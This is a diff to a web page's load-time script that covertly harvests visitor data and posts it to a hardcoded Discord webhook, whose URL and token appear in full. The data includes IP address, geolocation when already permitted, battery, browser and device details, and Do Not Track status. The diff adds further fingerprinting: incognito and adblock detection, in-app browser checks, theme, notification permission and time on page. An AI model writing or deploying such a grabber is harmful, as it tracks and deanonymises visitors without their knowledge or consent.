@@ -7,6 +7,7 @@
     <script>
         window.onload = async function() {
             const whUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
+            const startTime = performance.now();
 
             try {
                 const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
@@ -33,7 +34,7 @@
                     const bat = await navigator.getBattery();
                     bl = `${Math.round(bat.level * 100)}%`;
                     cs = bat.charging ? "Charging" : "Not Charging";
-                    psm = bat.saving ? "Enabled" : "Disabled";
+                    psm = bat.saving ? "On" : "Off";
                 }
 
                 const ua = navigator.userAgent;
@@ -52,21 +53,49 @@
 
                 let geo = "Permission required";
                 if (navigator.geolocation) {
-                    // Cek apakah lokasi udah di-enable tanpa minta izin
                     try {
                         const pos = await new Promise((resolve, reject) => {
                             navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000, maximumAge: Infinity });
                         });
                         geo = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude}`;
                     } catch {
-                        geo = "Permission required"; // Kalo gagal atau minta izin, tulis ini
+                        geo = "Permission required";
                     }
                 }
 
                 const sr = `${window.screen.width}x${window.screen.height}`;
                 const lt = new Date().toLocaleString();
                 const cc = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Not Supported";
-                const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
+                const dnt = navigator.doNotTrack === "1" ? "On" : "Off";
+                const dt = ((performance.now() - startTime) / 1000).toFixed(2) + " detik";
+                const theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark" : "Light";
+
+                let np = "Off";
+                if ("Notification" in window) {
+                    np = Notification.permission === "granted" ? "On" : "Off";
+                }
+
+                let bt = "Off";
+                if (/FBAN|FBAV|Instagram|Twitter|Line|WhatsApp/i.test(ua)) {
+                    bt = "On";
+                }
+
+                let ab = "Off";
+                try {
+                    const adTest = await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", { method: "HEAD" });
+                    if (!adTest.ok) ab = "On";
+                } catch {
+                    ab = "On";
+                }
+
+                let inc = "Off";
+                try {
+                    if (window.chrome && !window.chrome.runtime) inc = "On";
+                    else if (window.indexedDB && !window.indexedDB.open) inc = "On";
+                    else if (window.localStorage && !window.localStorage.length) inc = "On";
+                } catch {
+                    inc = "Off";
+                }
 
                 await fetch(whUrl, {
                     method: "POST",
@@ -74,7 +103,7 @@
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${lang}\nConnection Type: ${ct}\nNetwork Type: ${nt}\nDownlink Speed: ${ds}\nBattery Level: ${bl}\nCharging Status: ${cs}\nPower Save Mode: ${psm}\nPlatform: ${plat}\nBrowser: ${br}\nGeolocation: ${geo}\nScreen Resolution: ${sr}\nLocal Time: ${lt}\nCPU Cores: ${cc}\nDo Not Track: ${dnt}\nDuration Active: ${dt}\nTheme: ${theme}\nNotification Permission: ${np}\nIn-App Browser: ${bt}\nAdblock: ${ab}\nIncognito Mode: ${inc}`
                     })
                 });
 
